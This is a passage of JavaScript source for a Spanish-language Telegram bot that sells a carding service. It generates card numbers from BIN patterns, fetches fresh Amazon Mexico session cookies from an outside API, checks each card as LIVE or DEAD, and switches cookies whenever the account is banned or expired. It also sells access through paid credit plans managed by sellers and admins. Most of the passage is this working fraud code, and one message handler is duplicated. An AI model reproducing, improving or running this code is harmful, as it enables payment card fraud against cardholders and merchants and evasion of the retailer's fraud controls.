            await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
        }
        return;
    }
    
    try {
        const normalized = normalizarExtra(param);
        const testTarjetas = generarTarjetasDesdePatron(normalized, 1);
        if (testTarjetas && testTarjetas.length > 0) {
            tarjetas = generarTarjetasDesdePatron(normalized, 20);
            await sendSafeMessage(chatId, `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
            await sendSafeMessage(chatId, '🍪 Generando cookie para verificación...');
            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
            });
            const data = await response.json();
            if (!data.success) throw new Error('Error al generar cookie');
            const cookie = data.data.cookie_string;
            await updateUserCookie(telegramId, cookie);
            const creditResult = await deductCredits(telegramId, 4);
            await sendSafeMessage(chatId, `✅ Cookie generada. Créditos restantes: ${creditResult?.newCredits || '?'}.`);
            await verificarTarjetasConCookie(chatId, cookie, tarjetas, null);
        } else {
            await sendSafeMessage(chatId, '❌ Formato no reconocido. Envía un BIN, extra o lista de tarjetas.');
        }
    } catch (err) {
        await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
    }
});

// ========== COMANDO /GRACIAS ==========
bot.onText(/^[\/\.]gracias$/i, async (msg) => {
    const chatId = msg.chat.id;
    await sendSafeMessage(chatId, "D nada preciosaa (˶ᵔ ᵕ ᵔ˶) ‹𝟹, un placer contruibuir a alcanzar tu autonomía económica, emocional y espiritual ୭ ˚. ᵎᵎ");
});

bot.onText(/^[\/\.](?:amazon\b|amz\b)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let param = getCommandParam(msg, 'amazon') || getCommandParam(msg, 'amz');
    if (!param && msg.reply_to_message && msg.reply_to_message.text) {
        param = msg.reply_to_message.text.trim();
    }
    if (!param) {
        setUserState(telegramId, { step: 'awaiting_amazon_cards' });
        return sendSafeMessage(chatId, '💳 Envía tarjetas, patrón, BIN o nombre de banco:');
    }
    await handleAmazonCommand(chatId, telegramId, param);
    clearUserState(telegramId);
});

bot.onText(/^[\/\.]amazonmulticookie(?:\s+([^\s]+)(?:\s+(\d+))?)?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let param = match[1];
    let count = match[2] ? parseInt(match[2]) : 10;
    if (count > 20) count = 20; // límite de seguridad

    if (!param) {
        return sendSafeMessage(chatId, '❌ Uso: /amazonmulticookie <BIN|banco|extra> [cantidad_extras]');
    }

    // Verificar créditos del usuario (necesitará count * 4)
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, count * 4)) return;

    // Determinar si es BIN, banco o extra
    let extras = [];
    const esBin = /^\d{6}$/.test(param);
    const esBanco = !esBin && getBinForBank(param) !== null;
    const normalizedExtra = normalizarExtra(param);
    const esExtra = normalizedExtra.includes('|') && /[0-9X]+\|\d{1,2}\|\d{2,4}/.test(normalizedExtra);

    try {
        if (esBin || esBanco) {
            let bin = esBin ? param : getBinForBank(param);
            await sendSafeMessage(chatId, `🔍 Extrapolando BIN ${bin} para obtener patrones...`);
            extras = await getPatternsFromBin(chatId, bin);
            if (extras.length === 0) throw new Error('No se encontraron patrones');
            extras = extras.slice(0, count);
            await sendSafeMessage(chatId, `📋 Se utilizarán ${extras.length} extras de un total de ${extras.length} disponibles.`);
        } else if (esExtra) {
            // Si es un extra directo, solo se usa ese extra (count se ignora o se usa para número de tarjetas?)
            extras = [normalizedExtra];
        } else {
            // Si es lista de tarjetas, tratarlo como un solo extra? O mejor no.
            return sendSafeMessage(chatId, '❌ Formato no reconocido. Usa un BIN (6 dígitos) o nombre de banco.');
        }

        if (extras.length === 0) return sendSafeMessage(chatId, '❌ No se encontraron extras para procesar.');

        await sendSafeMessage(chatId, `🔄 Procesando ${extras.length} extras en paralelo (cada uno con su cookie)... Esto puede tardar varios minutos.`);

        // Procesar cada extra en paralelo (máximo 10 a la vez para no saturar)
        const resultadosExtras = [];
        const chunks = [];
        for (let i = 0; i < extras.length; i += 5) {
            chunks.push(extras.slice(i, i + 5));
        }
        for (const chunk of chunks) {
            const batchResults = await Promise.all(chunk.map((extra, idx) =>
                procesarExtraConCookie(chatId, extra, idx + 1).catch(err => ({ extra, error: err.message }))
            ));
            resultadosExtras.push(...batchResults);
        }

        // Mostrar resultados agregados
        let mensajeFinal = `📊 *RESULTADOS DE MULTICHEQUEO*\nSe procesaron ${extras.length} extras.\n\n`;
        for (let i = 0; i < resultadosExtras.length; i++) {
            const res = resultadosExtras[i];
            const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
            mensajeFinal += `━━━ Extra ${i+1}: \`${res.extra}\` ━━━\n`;
            if (res.error) {
                mensajeFinal += `❌ Error: ${res.error}\n`;
            } else {
                const total = res.resultados.length;
                let lives = res.resultados.filter(r => r.status === 'LIVE').length;
                let deads = res.resultados.filter(r => r.status === 'DEAD').length;
                let errors = res.resultados.filter(r => r.status === 'ERROR').length;
                mensajeFinal += `✅ Verificadas: ${total} | 💚 LIVE: ${lives} | ❌ DEAD: ${deads} | ⚠️ ERROR: ${errors}\n`;
                // Opcional: mostrar primeras 3 tarjetas
                const primeras = res.resultados.slice(0, 3).map(r => `\`${r.card}\` → ${r.status}`).join('\n');
                mensajeFinal += `Ejemplos:\n${primeras}\n`;
            }
            mensajeFinal += `${separador}\n\n`;
            if (mensajeFinal.length > 3900) break;
        }
        await sendSafeMessage(chatId, mensajeFinal, { parse_mode: 'Markdown' });

        // Descontar créditos (cada extra cuesta 4 créditos por cookie)
        const totalCredits = extras.length * 4;
        const creditResult = await deductCredits(telegramId, totalCredits);
        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
    } catch (error) {
        console.error('Error en /amazonmulticookie:', error);
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

bot.onText(/^[\/\.](?:amazonmulticookieinfinita|amzckmultiinfinita|amzckmulti)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let fullParam = match[1];
    if (!fullParam) {
        return sendSafeMessage(chatId, '❌ Uso: /amazonmulticookieinfinita <BIN> [num_extras] [tarjetas_por_extra]   o pega una lista de extras');
    }

    // Intentar determinar si es BIN o lista de extras
    let extrasList = [];
    let tarjetasPorExtra = 100; // valor por defecto
    let numExtras = null;

    // Caso 1: El parámetro es un BIN de 6 dígitos (puede tener más números después)
    const parts = fullParam.trim().split(/\s+/);
    if (parts.length >= 1 && /^\d{6}$/.test(parts[0])) {
        const bin = parts[0];
        numExtras = parts[1] ? parseInt(parts[1]) : 10;
        tarjetasPorExtra = parts[2] ? parseInt(parts[2]) : 100;
        if (numExtras > 50) numExtras = 50;
        if (tarjetasPorExtra > 500) tarjetasPorExtra = 500;
        await sendSafeMessage(chatId, `🔍 Extrapolando BIN ${bin} para obtener patrones...`);
        try {
            const allExtras = await getPatternsFromBin(chatId, bin);
            if (allExtras.length === 0) throw new Error('No se encontraron extras');
            extrasList = allExtras.slice(0, numExtras);
            await sendSafeMessage(chatId, `✅ Se usarán ${extrasList.length} extras (de un total de ${allExtras.length})`);
        } catch (err) {
            return sendSafeMessage(chatId, `❌ Error al obtener extras: ${err.message}`);
        }
    } else {
        // Caso 2: El parámetro es texto libre (lista de extras)
        // Se asume que cada línea contiene un patrón de extra (con | y X)
        const lines = fullParam.split(/\r?\n/);
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed) continue;
            // Intentar extraer un patrón de extra (ignorar textos como "🟢 MUY REPETIDOS" etc.)
            const matchExtra = trimmed.match(/([0-9X]{6,16}\|\d{1,2}\|\d{2,4}(?:\|rnd)?)/);
            if (matchExtra) {
                let extra = matchExtra[1];
                if (!extra.endsWith('|rnd')) extra += '|rnd';
                extrasList.push(extra);
            }
        }
        if (extrasList.length === 0) {
            return sendSafeMessage(chatId, '❌ No se encontraron patrones de extra en el texto. Debes proporcionar un BIN o una lista de extras.');
        }
        tarjetasPorExtra = parts[1] ? parseInt(parts[1]) : 100;
        if (tarjetasPorExtra > 500) tarjetasPorExtra = 500;
    }

    // Verificar créditos aproximados (cada extra puede usar muchas cookies, no podemos saber exactas, pero pedimos al menos 4 por extra)
    const creditsNeeded = extrasList.length * 4;
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, creditsNeeded)) return;

    await sendSafeMessage(chatId, `🔄 Procesando ${extrasList.length} extras, cada uno generará hasta ${tarjetasPorExtra} tarjetas con rotación de cookies.`);

    let resultadosExtras = [];
    let totalGlobal = { lives: 0, deads: 0, errors: 0, cookies: 0, tarjetas: 0 };

    // Procesar cada extra secuencialmente (para evitar sobrecarga de cookies en paralelo)
    for (let idx = 0; idx < extrasList.length; idx++) {
        const extra = extrasList[idx];
        await sendSafeMessage(chatId, `\n📌 Procesando extra ${idx+1}/${extrasList.length}: \`${extra}\``);
        try {
            const res = await procesarExtraInfinita(chatId, telegramId, extra, tarjetasPorExtra, idx);
            resultadosExtras.push(res);
            totalGlobal.lives += res.stats.lives;
            totalGlobal.deads += res.stats.deads;
            totalGlobal.errors += res.stats.errors;
            totalGlobal.cookies += res.stats.cookiesUsadas;
            totalGlobal.tarjetas += res.totalTarjetas;
            await sendSafeMessage(chatId, `✅ Extra ${idx+1} completado: 💚 LIVE ${res.stats.lives} | ❌ DEAD ${res.stats.deads} | ⚠️ ERROR ${res.stats.errors} | 🍪 Cookies: ${res.stats.cookiesUsadas}`);
        } catch (err) {
            await sendSafeMessage(chatId, `❌ Error en extra ${idx+1}: ${err.message}`);
        }
    }

    // Resumen final
    const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
    let resumen = `📊 *RESULTADO FINAL - MULTI EXTRAS INFINITAS*\n`;
    resumen += `🔹 Extras procesados: ${resultadosExtras.length}\n`;
    resumen += `🔹 Tarjetas totales verificadas: ${totalGlobal.tarjetas}\n`;
    resumen += `🔹 Créditos consumidos (aprox): ${totalGlobal.cookies * 4}\n`;
    resumen += `🔹 Cookies utilizadas: ${totalGlobal.cookies}\n`;
    resumen += `💚 LIVE: ${totalGlobal.lives} | ❌ DEAD: ${totalGlobal.deads} | ⚠️ ERROR: ${totalGlobal.errors}\n`;
    resumen += `${separador}\n`;
    // Detalles por extra (primeros 10)
    resumen += `📋 *Detalles por extra:*\n`;
    for (let i = 0; i < Math.min(resultadosExtras.length, 10); i++) {
        const r = resultadosExtras[i];
        resumen += `${i+1}. \`${r.extra.substring(0, 30)}...\` → 💚 ${r.stats.lives} | ❌ ${r.stats.deads} | ⚠️ ${r.stats.errors} (🍪 ${r.stats.cookiesUsadas})\n`;
    }
    if (resultadosExtras.length > 10) resumen += `... y ${resultadosExtras.length - 10} extras más.\n`;
    await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
});

// ========== COMANDO /amazoncookieinfinita (con cookie de reserva asíncrona) ==========
// ========== COMANDO /amazoncookieinfinita (totalmente reescrito) ==========
// ========== COMANDO /amazoncookieinfinita (soporta hasta 500 tarjetas) ==========
bot.onText(/^[\/\.](?:amazoncookieinfinita|amzckin|amazoninfinita)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let fullParam = match[1] ? match[1].trim() : '';

    // Función auxiliar para verificar una tarjeta con una cookie
    const verificarTarjetaConCookie = async (card, cookie) => {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 120000);
            const resp = await fetch(API_AMAZON_CHECK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ card, cookies: cookie }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await resp.json();
            const isBanned = data.message && (
                data.message.toLowerCase().includes('cookie expirada') ||
                data.message.toLowerCase().includes('inicia sesión') ||
                data.message.toLowerCase().includes('cuenta baneada') ||
                data.message.toLowerCase().includes('account banned') ||
                data.message.toLowerCase().includes('entra a mi cuenta')
            );
            return { status: data.status, isBanned, message: data.message };
        } catch (err) {
            return { status: 'ERROR', isBanned: false, message: err.message };
        }
    };

    // Función para generar cookie, descontar créditos y actualizar contador
    const generarCookieAsync = async () => {
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ country: 'MX', add_address: true })
        });
        const data = await response.json();
        if (!data.success) throw new Error('Error generando cookie');
        const creditResult = await deductCredits(telegramId, 4);
        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
        await pool.query('UPDATE users SET cookies_generated = cookies_generated + 1 WHERE telegram_id = $1', [telegramId]);
        return data.data.cookie_string;
    };

    try {
        // ========== 1. DETECTAR LISTA DE TARJETAS DIRECTAS ==========
        let tarjetas = [];
        const lineas = fullParam.split(/\r?\n/);
        for (const linea of lineas) {
            // Patrón: 16 dígitos | MM | AAAA | CVV (puede tener espacios alrededor de |)
            const cardMatch = linea.match(/(\d{16})\s*[|]\s*(\d{2})\s*[|]\s*(\d{4})\s*[|]\s*(\d{3,4})/);
            if (cardMatch) {
                tarjetas.push(`${cardMatch[1]}|${cardMatch[2]}|${cardMatch[3]}|${cardMatch[4]}`);
            }
        }

        // Si hay al menos una tarjeta, procesar directamente
        if (tarjetas.length > 0) {
            let totalTarjetas = tarjetas.length;
            if (totalTarjetas > 200) {
                tarjetas = tarjetas.slice(0, 200);
                await sendSafeMessage(chatId, `⚠️ Se encontraron ${totalTarjetas} tarjetas, pero el límite máximo es 200. Se verificarán las primeras 200.`);
            }
            await sendSafeMessage(chatId, `📋 Se verificarán ${tarjetas.length} tarjetas con rotación infinita de cookies.`);
            let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 0 };
            let currentCookie = null;
            let nextCookiePromise = null;
            
            currentCookie = await generarCookieAsync();
            nextCookiePromise = generarCookieAsync().catch(err => { console.error(err); return null; });
            stats.cookiesUsadas++;
            
            let progressMsg = await sendSafeMessage(chatId, `🔄 Iniciando verificación... 0/${tarjetas.length} tarjetas. Cookies usadas: ${stats.cookiesUsadas}`);
            
            for (let i = 0; i < tarjetas.length; i++) {
                const resultado = await verificarTarjetaConCookie(tarjetas[i], currentCookie);
                if (resultado.status === 'LIVE') stats.lives++;
                else if (resultado.status === 'DEAD') stats.deads++;
                else stats.errors++;
                
                if (resultado.isBanned) {
                    // Cambiar a cookie de reserva
                    if (nextCookiePromise) {
                        currentCookie = await nextCookiePromise;
                        if (!currentCookie) throw new Error('No se pudo obtener cookie de reserva');
                    } else {
                        currentCookie = await generarCookieAsync();
                    }
                    // Lanzar nueva reserva
                    nextCookiePromise = generarCookieAsync().catch(err => { console.error(err); return null; });
                    stats.cookiesUsadas++;
                    await sendSafeMessage(chatId, `🔄 Cookie renovada (${stats.cookiesUsadas}) después de tarjeta ${i+1}`);
                }
                
                // Actualizar progreso cada 10 tarjetas o cuando se cambia cookie
                if ((i+1) % 10 === 0 || resultado.isBanned) {
                    try {
                        await bot.editMessageText(
                            `🔄 Verificando... ${i+1}/${tarjetas.length}\n` +
                            `💚 LIVE: ${stats.lives} | ❌ DEAD: ${stats.deads} | ⚠️ ERROR: ${stats.errors}\n` +
                            `🍪 Cookies usadas: ${stats.cookiesUsadas}`,
                            { chat_id: chatId, message_id: progressMsg.message_id }
                        );
                    } catch (e) {}
                }
                await new Promise(r => setTimeout(r, 800));
            }
            if (nextCookiePromise) nextCookiePromise.catch(() => {});
            
            const resumen = `📊 *RESULTADO FINAL - LISTA DE TARJETAS*\n` +
                            `🔹 Tarjetas verificadas: ${tarjetas.length}\n` +
                            `🔹 Créditos consumidos: ${stats.cookiesUsadas * 4}\n` +
                            `💚 LIVE: ${stats.lives} | ❌ DEAD: ${stats.deads} | ⚠️ ERROR: ${stats.errors}\n` +
                            `🍪 Cookies usadas: ${stats.cookiesUsadas}`;
            await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
            return;
        }

        // ========== 2. NO HAY TARJETAS DIRECTAS → EXTRA, BIN O BANCO ==========
        if (!fullParam) {
            setUserState(telegramId, { step: 'awaiting_amazoninfinita_param' });
            return sendSafeMessage(chatId, '📌 Envía un BIN (6 dígitos), nombre de banco, un extra (ej. 481515xxxx|09|2029|rnd) o una lista de tarjetas (una por línea).');
        }

        let extra = null;
        const esBin = /^\d{6}$/.test(fullParam);
        const esBanco = !esBin && getBinForBank(fullParam) !== null;
        
        if (esBin || esBanco) {
            const bin = esBin ? fullParam : getBinForBank(fullParam);
            await sendSafeMessage(chatId, `🔍 Extrapolando BIN ${bin}...`);
            const extrasList = await getPatternsFromBin(chatId, bin);
            if (!extrasList.length) throw new Error('No se encontraron patrones para ese BIN');
            extra = extrasList[0];
            await sendSafeMessage(chatId, `✅ Extra elegido: \`${extra}\``);
        } else {
            extra = normalizarExtra(fullParam);
            const test = generarTarjetasDesdePatron(extra, 1);
            if (!test || test.length === 0) throw new Error('Formato inválido. Usa un extra con X o una lista de tarjetas.');
            await sendSafeMessage(chatId, `🎴 Extra validado: \`${extra}\``);
        }

        // Preguntar cantidad (interactivo)
        setUserState(telegramId, { step: 'awaiting_amazoninfinita_cantidad', data: { extra } });
        return sendSafeMessage(chatId, '🔢 ¿Cuántas tarjetas quieres generar y verificar? (máximo 500, por defecto 100)');

    } catch (error) {
        console.error('Error en /amazoncookieinfinita:', error);
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
        clearUserState(telegramId);
    }
});

// Manejador interactivo para la cantidad (soporta hasta 500)
bot.on('message', async (msg) => {
    const telegramId = msg.from.id;
    // Buscar usuario en BD
    const userRes = await pool.query('SELECT id, username, telegram_username, display_name FROM users WHERE telegram_id = $1', [telegramId]);
    if (userRes.rows.length > 0) {
        const userId = userRes.rows[0].id;
        const currentUsername = msg.from.username || null;
        const currentFullName = (msg.from.first_name || '') + (msg.from.last_name ? ' ' + msg.from.last_name : '');
        await checkAndUpdateTelegramProfile(telegramId, userId, currentUsername, currentFullName);
    }

    const state = userStates.get(msg.from.id);
    if (!state) return;
    if (state.step === 'awaiting_amazoninfinita_cantidad') {
        const chatId = msg.chat.id;
        const telegramId = msg.from.id;
        const extra = state.data.extra;
        let cantidad = parseInt(msg.text);
        if (isNaN(cantidad) || cantidad < 1) cantidad = 100;
        if (cantidad > 500) cantidad = 500;
        clearUserState(telegramId);
        await sendSafeMessage(chatId, `🃏 Generando ${cantidad} tarjetas desde el extra...`);
        
        try {
            const todasLasTarjetas = generarTarjetasDesdePatron(extra, cantidad);
            const total = todasLasTarjetas.length;
            if (total === 0) throw new Error('No se generaron tarjetas');
            
            let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 0 };
            let currentCookie = null;
            let nextCookiePromise = null;
            
            const generarCookieAsync = async () => {
                const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ country: 'MX', add_address: true })
                });
                const data = await response.json();
                if (!data.success) throw new Error('Error generando cookie');
                const creditResult = await deductCredits(telegramId, 4);
                if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
                await pool.query('UPDATE users SET cookies_generated = cookies_generated + 1 WHERE telegram_id = $1', [telegramId]);
                stats.cookiesUsadas++;
                return data.data.cookie_string;
            };
            
            const verificarTarjetaConCookie = async (card, cookie) => {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 120000);
                    const resp = await fetch(API_AMAZON_CHECK_URL, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ card, cookies: cookie }), signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    const data = await resp.json();
                    const isBanned = data.message && (
                        data.message.toLowerCase().includes('cookie expirada') ||
                        data.message.toLowerCase().includes('inicia sesión') ||
                        data.message.toLowerCase().includes('cuenta baneada')
                    );
                    return { status: data.status, isBanned, message: data.message };
                } catch (err) {
                    return { status: 'ERROR', isBanned: false, message: err.message };
                }
            };
            
            currentCookie = await generarCookieAsync();
            nextCookiePromise = generarCookieAsync().catch(err => { console.error(err); return null; });
            let progressMsg = await sendSafeMessage(chatId, `🔄 Verificando 0/${total} tarjetas... Cookies usadas: 1`);
            
            for (let i = 0; i < total; i++) {
                const resultado = await verificarTarjetaConCookie(todasLasTarjetas[i], currentCookie);
                if (resultado.status === 'LIVE') stats.lives++;
                else if (resultado.status === 'DEAD') stats.deads++;
                else stats.errors++;
                if (resultado.isBanned) {
                    if (nextCookiePromise) {
                        currentCookie = await nextCookiePromise;
                        if (!currentCookie) throw new Error('No se pudo obtener cookie de reserva');
                    } else {
                        currentCookie = await generarCookieAsync();
                    }
                    nextCookiePromise = generarCookieAsync().catch(err => { console.error(err); return null; });
                    stats.cookiesUsadas++;
                }
                if ((i+1) % 10 === 0 || resultado.isBanned) {
                    try {
                        await bot.editMessageText(
                            `🔄 Verificando ${i+1}/${total}\n` +
                            `💚 LIVE: ${stats.lives} | ❌ DEAD: ${stats.deads} | ⚠️ ERROR: ${stats.errors}\n` +
                            `🍪 Cookies usadas: ${stats.cookiesUsadas}`,
                            { chat_id: chatId, message_id: progressMsg.message_id }
                        );
                    } catch (e) {}
                }
                await new Promise(r => setTimeout(r, 800));
            }
            if (nextCookiePromise) nextCookiePromise.catch(() => {});
            const resumen = `📊 *RESULTADO FINAL - EXTRAPOLACIÓN INFINITA*\n` +
                            `🔹 Extra: \`${extra}\`\n` +
                            `🔹 Tarjetas verificadas: ${total}\n` +
                            `🔹 Créditos consumidos: ${stats.cookiesUsadas * 4}\n` +
                            `💚 LIVE: ${stats.lives} | ❌ DEAD: ${stats.deads} | ⚠️ ERROR: ${stats.errors}\n` +
                            `🍪 Cookies usadas: ${stats.cookiesUsadas}`;
            await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
        } catch (error) {
            await sendSafeMessage(chatId, `❌ Error durante verificación: ${error.message}`);
        }
    }
});
// Manejador interactivo para la cantidad de tarjetas
bot.on('message', async (msg) => {
    const state = userStates.get(msg.from.id);
    if (!state) return;
    if (state.step === 'awaiting_amazoninfinita_cantidad') {
        const chatId = msg.chat.id;
        const telegramId = msg.from.id;
        const extra = state.data.extra;
        let cantidad = parseInt(msg.text);
        if (isNaN(cantidad) || cantidad < 1) cantidad = 100;
        if (cantidad > 500) cantidad = 500;
        clearUserState(telegramId);
        await sendSafeMessage(chatId, `🃏 Generando ${cantidad} tarjetas desde el extra...`);
        try {
            const todasLasTarjetas = generarTarjetasDesdePatron(extra, cantidad);
            const total = todasLasTarjetas.length;
            if (total === 0) throw new Error('No se generaron tarjetas');
            
            let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 0 };
            let currentCookie = null;
            let nextCookiePromise = null;
            
            const generarCookieAsync = async () => {
                const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ country: 'MX', add_address: true })
                });
                const data = await response.json();
                if (!data.success) throw new Error('Error generando cookie');
                const creditResult = await deductCredits(telegramId, 4);
                if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
                await pool.query('UPDATE users SET cookies_generated = cookies_generated + 1 WHERE telegram_id = $1', [telegramId]);
                stats.cookiesUsadas++;
                return data.data.cookie_string;
            };
            
            const verificarTarjetaConCookie = async (card, cookie) => {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 120000);
                    const resp = await fetch(API_AMAZON_CHECK_URL, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ card, cookies: cookie }), signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    const data = await resp.json();
                    const isBanned = data.message && (
                        data.message.toLowerCase().includes('cookie expirada') ||
                        data.message.toLowerCase().includes('inicia sesión') ||
                        data.message.toLowerCase().includes('cuenta baneada')
                    );
                    return { status: data.status, isBanned, message: data.message };
                } catch (err) {
                    return { status: 'ERROR', isBanned: false, message: err.message };
                }
            };
            
            currentCookie = await generarCookieAsync();
            nextCookiePromise = generarCookieAsync().catch(err => { console.error(err); return null; });
            let progressMsg = await sendSafeMessage(chatId, `🔄 Verificando 0/${total} tarjetas... Cookies: 1`);
            
            for (let i = 0; i < total; i++) {
                const resultado = await verificarTarjetaConCookie(todasLasTarjetas[i], currentCookie);
                if (resultado.status === 'LIVE') stats.lives++;
                else if (resultado.status === 'DEAD') stats.deads++;
                else stats.errors++;
                if (resultado.isBanned) {
                    if (nextCookiePromise) {
                        currentCookie = await nextCookiePromise;
                        if (!currentCookie) throw new Error('No se pudo obtener cookie de reserva');
                    } else {
                        currentCookie = await generarCookieAsync();
                    }
                    nextCookiePromise = generarCookieAsync().catch(err => { console.error(err); return null; });
                    stats.cookiesUsadas++;
                }
                if ((i+1) % 10 === 0 || resultado.isBanned) {
                    try {
                        await bot.editMessageText(
                            `🔄 Verificando ${i+1}/${total}\n` +
                            `💚 LIVE: ${stats.lives} | ❌ DEAD: ${stats.deads} | ⚠️ ERROR: ${stats.errors}\n` +
                            `🍪 Cookies usadas: ${stats.cookiesUsadas}`,
                            { chat_id: chatId, message_id: progressMsg.message_id }
                        );
                    } catch (e) {}
                }
                await new Promise(r => setTimeout(r, 800));
            }
            if (nextCookiePromise) nextCookiePromise.catch(() => {});
            const resumen = `📊 *RESULTADO FINAL - EXTRAPOLACIÓN INFINITA*\n` +
                            `🔹 Extra: \`${extra}\`\n` +
                            `🔹 Tarjetas verificadas: ${total}\n` +
                            `🔹 Créditos consumidos: ${stats.cookiesUsadas * 4}\n` +
                            `💚 LIVE: ${stats.lives} | ❌ DEAD: ${stats.deads} | ⚠️ ERROR: ${stats.errors}\n` +
                            `🍪 Cookies usadas: ${stats.cookiesUsadas}`;
            await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
        } catch (error) {
            await sendSafeMessage(chatId, `❌ Error durante verificación: ${error.message}`);
        }
    }
});

bot.onText(/^[\/\.]setcredits(?:\s+([^\s]+)\s+(\d+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    let target = match[1];
    let amount = match[2];

    // Si no se usó el comando con argumentos, revisar reply
    if (!target && msg.reply_to_message && msg.reply_to_message.text) {
        const replyText = msg.reply_to_message.text.trim();
        const parts = replyText.split(/\s+/);
        if (parts.length >= 2) {
            target = parts[0];
            amount = parts[1];
        } else {
            target = parts[0];
            amount = null;
        }
    }

    // Si el target es un ID numérico pequeño (probablemente no real), lo ignoramos
    if (target && /^\d+$/.test(target) && parseInt(target) < 10000) {
        target = null;
    }

    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin') {
        return sendSafeMessage(chatId, '❌ Solo administradores pueden usar este comando.');
    }

    if (!target || !amount) {
        setUserState(requesterId, { step: 'awaiting_setcredits' });
        return sendSafeMessage(chatId, '💳 Envía @usuario|id y la cantidad de créditos (ej. @usuario 100):');
    }

    try {
        const user = await findUserByUsernameOrId(target, role);
        await callApiWithBotKey(`/admin/users/${user.id}/credits`, 'PUT', { credits: parseInt(amount), reason: 'Ajuste por bot' });
        await sendSafeMessage(chatId, `✅ Se establecieron ${amount} créditos para ${user.username}.`);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

const planConfig = {
    '20': { credits: 20, days: 3 },
    '60': { credits: 60, days: 7 },
    '120': { credits: 120, days: 15 },
    '200': { credits: 200, days: 30 }
};

bot.onText(/^[\/\.]setplan(20|60|120|200)(?:\s+([^\s]+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    const plan = match[1];      // '20', '60', '120' o '200'
    let target = match[2];      // puede ser undefined

    if (!target && msg.reply_to_message && msg.reply_to_message.text) {
        target = msg.reply_to_message.text.trim();
    }

    // Limpiar @ si viene
    if (target && target.startsWith('@')) target = target.substring(1);

    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin' && role !== 'seller') {
        return sendSafeMessage(chatId, '❌ No tienes permiso para usar este comando.');
    }

    if (!target) {
        setUserState(requesterId, { step: `awaiting_setplan_${plan}` });
        return sendSafeMessage(chatId, `💎 Envía @usuario|id para asignar el plan ${plan} (${planConfig[plan].credits} créditos / ${planConfig[plan].days} días):`);
    }

    try {
        const user = await findUserByUsernameOrId(target, role);
        const { credits, days } = planConfig[plan];
        await callApiWithBotKey(`/admin/users/${user.id}/credits`, 'PUT', { credits, reason: `Plan ${plan}` });
        await callApiWithBotKey(`/admin/users/${user.id}/days`, 'PUT', { days, reason: `Plan ${plan}` });
        await sendSafeMessage(chatId, `✅ Plan ${plan} asignado a ${user.username}: ${credits} créditos y ${days} días.`);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

bot.onText(/^[\/\.]setdays(?:\s+([^\s]+)\s+(\d+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    let target = match[1];
    let days = match[2];

    if (!target && msg.reply_to_message && msg.reply_to_message.text) {
        const replyText = msg.reply_to_message.text.trim();
        const parts = replyText.split(/\s+/);
        if (parts.length >= 2) {
            target = parts[0];
            days = parts[1];
        } else {
            target = parts[0];
            days = null;
        }
    }

    if (target && /^\d+$/.test(target) && parseInt(target) < 10000) {
        target = null;
    }

    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin') {
        return sendSafeMessage(chatId, '❌ Solo administradores pueden usar este comando.');
    }

    if (!target || !days) {
        setUserState(requesterId, { step: 'awaiting_setdays' });
